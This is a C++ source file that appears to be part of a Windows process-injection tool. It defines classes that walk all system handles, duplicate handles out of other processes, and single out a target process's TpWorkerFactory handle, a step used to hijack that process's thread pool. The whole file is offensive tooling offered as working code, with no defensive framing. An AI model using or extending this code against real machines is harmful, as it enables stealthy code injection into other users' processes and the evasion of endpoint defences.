#include "HandleHijacker.hpp"

HandleHijacker::HandleHijacker(std::wstring wsObjectType) : m_wsObjectType(wsObjectType)
{
}

std::shared_ptr<HANDLE> HandleHijacker::Hijack(DWORD dwDesiredAccess)
{
    auto pSystemInformation = w_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16);
    auto pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)pSystemInformation.data();

    DWORD dwOwnerProcessId;
	std::shared_ptr<HANDLE> p_hDuplicatedObject;
    std::shared_ptr<HANDLE> p_hOwnerProcess;
    std::vector<BYTE> pObjectInformation;
    PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

    for (auto i = 0; i < pSystemHandleInformation->NumberOfHandles; i++)
    {
        try {
            dwOwnerProcessId = pSystemHandleInformation->Handles[i].UniqueProcessId;

            if(!IsDesiredOwnerProcess(dwOwnerProcessId))
            {
                continue;
            }

            p_hOwnerProcess = w_OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwOwnerProcessId);

            p_hDuplicatedObject = w_DuplicateHandle(
                *p_hOwnerProcess,
                UlongToHandle(pSystemHandleInformation->Handles[i].HandleValue), 
                GetCurrentProcess(),
                dwDesiredAccess,
                FALSE,
                NULL);


            pObjectInformation = w_NtQueryObject(*p_hDuplicatedObject, ObjectTypeInformation);
            pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

            if (m_wsObjectType != std::wstring(pObjectTypeInformation->TypeName.Buffer)) {
                continue;
            }

            if(!IsDesiredHandle(p_hDuplicatedObject))
            {
                continue;
            }

            return p_hDuplicatedObject;
        }
        catch (WindowsException)
        {
            continue;
        }
    }

    throw std::runtime_error("Failed to hijack object handle");
}

bool HandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
{
	return true;
}

bool HandleHijacker::IsDesiredHandle(std::shared_ptr<HANDLE> p_hHijackedObject)
{
	return true;
}

HandleHijacker::~HandleHijacker()
{
}

WorkerFactoryHandleHijacker::WorkerFactoryHandleHijacker(DWORD dwTargetPid) : HandleHijacker{ std::wstring(L"TpWorkerFactory") }, m_dwTargetPid(dwTargetPid)
{
}

bool WorkerFactoryHandleHijacker::IsDesiredOwnerProcess(DWORD dwOwnerProcessId)
{
	if (m_dwTargetPid == dwOwnerProcessId)
	{
        return true;
	}
    return false;
}

WorkerFactoryHandleHijacker::~WorkerFactoryHandleHijacker()
{
}